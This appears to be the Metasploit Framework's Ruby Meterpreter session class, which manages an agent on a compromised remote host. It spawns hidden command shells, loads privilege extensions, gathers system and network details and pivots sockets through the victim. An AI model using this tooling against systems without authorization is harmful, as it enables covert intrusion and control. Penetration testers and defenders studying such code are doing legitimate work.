# -*- coding: binary -*-

require 'msf/base'
require 'msf/base/sessions/scriptable'
require 'rex/post/meterpreter'

module Msf
module Sessions

###
#
# This class represents a session compatible interface to a meterpreter server
# instance running on a remote machine.  It provides the means of interacting
# with the server instance both at an API level as well as at a console level.
#
###
class Meterpreter < Rex::Post::Meterpreter::Client

	include Msf::Session
	#
	# The meterpreter session is interactive
	#
	include Msf::Session::Interactive
	include Msf::Session::Comm

	#
	# This interface supports interacting with a single command shell.
	#
	include Msf::Session::Provider::SingleCommandShell

	include Msf::Session::Scriptable

	# Override for server implementations that can't do ssl
	def supports_ssl?
		true
	end
	def supports_zlib?
		true
	end

	#
	# Initializes a meterpreter session instance using the supplied rstream
	# that is to be used as the client's connection to the server.
	#
	def initialize(rstream, opts={})
		super

		opts[:capabilities] = {
			:ssl => supports_ssl?,
			:zlib => supports_zlib?
		}
		if not opts[:skip_ssl]
			# the caller didn't request to skip ssl, so make sure we support it
			opts.merge!(:skip_ssl => (not supports_ssl?))
		end

		#
		# Initialize the meterpreter client
		#
		self.init_meterpreter(rstream, opts)

		#
		# Create the console instance
		#
		self.console = Rex::Post::Meterpreter::Ui::Console.new(self)
	end

	#
	# Returns the session type as being 'meterpreter'.
	#
	def self.type
		"meterpreter"
	end

	#
	# Calls the class method
	#
	def type
		self.class.type
	end

	##
	# :category: Msf::Session::Provider::SingleCommandShell implementors
	#
	# Create a channelized shell process on the target
	#
	def shell_init
		return true if @shell

		# COMSPEC is special-cased on all meterpreters to return a viable
		# shell.
		sh = fs.file.expand_path("%COMSPEC%")
		@shell = sys.process.execute(sh, nil, { "Hidden" => true, "Channelized" => true })

	end

	##
	# :category: Msf::Session::Provider::SingleCommandShell implementors
	#
	# Read from the command shell.
	#
	def shell_read(length=nil, timeout=1)
		shell_init

		length = nil if length.nil? or length < 0
		begin
			rv = nil
			# Meterpreter doesn't offer a way to timeout on the victim side, so
			# we have to do it here.  I'm concerned that this will cause loss
			# of data.
			Timeout.timeout(timeout) {
				rv = @shell.channel.read(length)
			}
			framework.events.on_session_output(self, rv) if rv
			return rv
		rescue ::Timeout::Error
			return nil
		rescue ::Exception => e
			shell_close
			raise e
		end
	end

	##
	# :category: Msf::Session::Provider::SingleCommandShell implementors
	#
	# Write to the command shell.
	#
	def shell_write(buf)
		shell_init

		begin
			framework.events.on_session_command(self, buf.strip)
			len = @shell.channel.write("#{buf}\n")
		rescue ::Exception => e
			shell_close
			raise e
		end

		len
	end

	##
	# :category: Msf::Session::Provider::SingleCommandShell implementors
	#
	# Terminate the shell channel
	#
	def shell_close
		@shell.close
		@shell = nil
	end

	def shell_command(cmd)
		# Send the shell channel's stdin.
		shell_write(cmd + "\n")

		timeout = 5
		etime = ::Time.now.to_f + timeout
		buff = ""

		# Keep reading data until no more data is available or the timeout is
		# reached.
		while (::Time.now.to_f < etime)
			res = shell_read(-1, timeout)
			break unless res
			timeout = etime - ::Time.now.to_f
			buff << res
		end

		buff
	end

	#
	# Called by PacketDispatcher to resolve error codes to names.
	# This is the default version (return the number itself)
	#
	def lookup_error(code)
		"#{code}"
	end

	##
	# :category: Msf::Session overrides
	#
	# Cleans up the meterpreter client session.
	#
	def cleanup
		cleanup_meterpreter

		super
	end

	##
	# :category: Msf::Session overrides
	#
	# Returns the session description.
	#
	def desc
		"Meterpreter"
	end


	##
	# :category: Msf::Session::Scriptable implementors
	#
	# Runs the meterpreter script in the context of a script container
	#
	def execute_file(full_path, args)
		o = Rex::Script::Meterpreter.new(self, full_path)
		o.run(args)
	end


	##
	# :category: Msf::Session::Interactive implementors
	#
	# Initializes the console's I/O handles.
	#
	def init_ui(input, output)
		self.user_input = input
		self.user_output = output
		console.init_ui(input, output)
		console.set_log_source(log_source)

		super
	end

	##
	# :category: Msf::Session::Interactive implementors
	#
	# Resets the console's I/O handles.
	#
	def reset_ui
		console.unset_log_source
		console.reset_ui
	end

	#
	# Terminates the session
	#
	def kill
		begin
			cleanup_meterpreter
			self.sock.close
		rescue ::Exception
		end
		framework.sessions.deregister(self)
	end

	#
	# Run the supplied command as if it came from suer input.
	#
	def queue_cmd(cmd)
		console.queue_cmd(cmd)
	end

	##
	# :category: Msf::Session::Interactive implementors
	#
	# Explicitly runs a command in the meterpreter console.
	#
	def run_cmd(cmd)
		console.run_single(cmd)
	end

	#
	# Load the stdapi extension.
	#
	def load_stdapi()
		original = console.disable_output
		console.disable_output = true
		console.run_single('load stdapi')
		console.disable_output = original
	end

	#
	# Load the priv extension.
	#
	def load_priv()
		original = console.disable_output

		console.disable_output = true
		console.run_single('load priv')
		console.disable_output = original
	end

	#
	# Populate the session information.
	#
	# Also reports a session_fingerprint note for host os normalization.
	#
	def load_session_info()
		begin
			::Timeout.timeout(60) do
				# Gather username/system information
				username  = self.sys.config.getuid
				sysinfo   = self.sys.config.sysinfo

				safe_info = "#{username} @ #{sysinfo['Computer']}"
				safe_info.force_encoding("ASCII-8BIT") if safe_info.respond_to?(:force_encoding)
				# Should probably be using Rex::Text.ascii_safe_hex but leave
				# this as is for now since "\xNN" is arguably uglier than "_"
				# showing up in various places in the UI.
				safe_info.gsub!(/[\x00-\x08\x0b\x0c\x0e-\x19\x7f-\xff]+/n,"_")
				self.info = safe_info

				# Enumerate network interfaces to detect IP
				ifaces   = self.net.config.get_interfaces().flatten rescue []
				routes   = self.net.config.get_routes().flatten rescue []
				shost    = self.session_host

				# Try to match our visible IP to a real interface
				# TODO: Deal with IPv6 addresses
				found    = !!(ifaces.find {|i| i.addrs.find {|a| a == shost } })
				nhost    = nil
				hobj     = nil

				if Rex::Socket.is_ipv4?(shost) and not found

					# Try to find an interface with a default route
					default_routes = routes.select{ |r| r.subnet == "0.0.0.0" || r.subnet == "::" }
					default_routes.each do |r|
						ifaces.each do |i|
							bits = Rex::Socket.net2bitmask( i.netmask ) rescue 32
							rang = Rex::Socket::RangeWalker.new( "#{i.ip}/#{bits}" ) rescue nil
							if rang and rang.include?( r.gateway )
								nhost = i.ip
								break
							end
						end
						break if nhost
					end

					# Find the first non-loopback address
					if not nhost
						iface = ifaces.select{|i| i.ip != "127.0.0.1" and i.ip != "::1" }
						if iface.length > 0
							nhost = iface.first.ip
						end
					end
				end

				# If we found a better IP address for this session, change it up
				# only handle cases where the DB is not connected here
				if  not (framework.db and framework.db.active)
					self.session_host = nhost
				end


				# The rest of this requires a database, so bail if it's not
				# there
				return if not (framework.db and framework.db.active)

				::ActiveRecord::Base.connection_pool.with_connection {
					wspace = framework.db.find_workspace(workspace)

					# Account for finding ourselves on a different host
					if nhost and self.db_record
						# Create or switch to a new host in the database
						hobj = framework.db.report_host(:workspace => wspace, :host => nhost)
						if hobj
							self.session_host = nhost
							self.db_record.host_id = hobj[:id]
						end
					end

					framework.db.report_note({
						:type => "host.os.session_fingerprint",
						:host => self,
						:workspace => wspace,
						:data => {
							:name => sysinfo["Computer"],
							:os => sysinfo["OS"],
							:arch => sysinfo["Architecture"],
						}
					})

					if self.db_record
						self.db_record.desc = safe_info
						self.db_record.save!
					end

					framework.db.update_host_via_sysinfo(:host => self, :workspace => wspace, :info => sysinfo)

					if nhost
						framework.db.report_note({
							:type      => "host.nat.server",
							:host      => shost,
							:workspace => wspace,
							:data      => { :info   => "This device is acting as a NAT gateway for #{nhost}", :client => nhost },
							:update    => :unique_data
						})
						framework.db.report_host(:host => shost, :purpose => 'firewall' )

						framework.db.report_note({
							:type      => "host.nat.client",
							:host      => nhost,
							:workspace => wspace,
							:data      => { :info => "This device is traversing NAT gateway #{shost}", :server => shost },
							:update    => :unique_data
						})
						framework.db.report_host(:host => nhost, :purpose => 'client' )
					end
				}

			end
		rescue ::Interrupt
			dlog("Interrupt while loading sysinfo: #{e.class}: #{e}")
			raise $!
		rescue ::Exception => e
			# Log the error but otherwise ignore it so we don't kill the
			# session if reporting failed for some reason
			elog("Error loading sysinfo: #{e.class}: #{e}")
			dlog("Call stack:\n#{e.backtrace.join("\n")}")
		end
	end

	##
	# :category: Msf::Session::Interactive implementors
	#
	# Interacts with the meterpreter client at a user interface level.
	#
	def _interact
		framework.events.on_session_interact(self)
		# Call the console interaction subsystem of the meterpreter client and
		# pass it a block that returns whether or not we should still be
		# interacting.  This will allow the shell to abort if interaction is
		# canceled.
		console.interact { self.interacting != true }

		# If the stop flag has been set, then that means the user exited.  Raise
		# the EOFError so we can drop this bitch like a bad habit.
		raise EOFError if (console.stopped? == true)
	end


	##
	# :category: Msf::Session::Comm implementors
	#
	# Creates a connection based on the supplied parameters and returns it to
	# the caller.  The connection is created relative to the remote machine on
	# which the meterpreter server instance is running.
	#
	def create(param)
		sock = nil

		# Notify handlers before we create the socket
		notify_before_socket_create(self, param)

		sock = net.socket.create(param)

		# sf: unsure if we should raise an exception or just return nil. returning nil for now.
		#if( sock == nil )
		#  raise Rex::UnsupportedProtocol.new(param.proto), caller
		#end

		# Notify now that we've created the socket
		notify_socket_created(self, sock, param)

		# Return the socket to the caller
		sock
	end

	attr_accessor :platform
	attr_accessor :binary_suffix
	attr_accessor :console # :nodoc:
	attr_accessor :skip_ssl
	attr_accessor :target_id

protected

	attr_accessor :rstream # :nodoc:

end

end
end

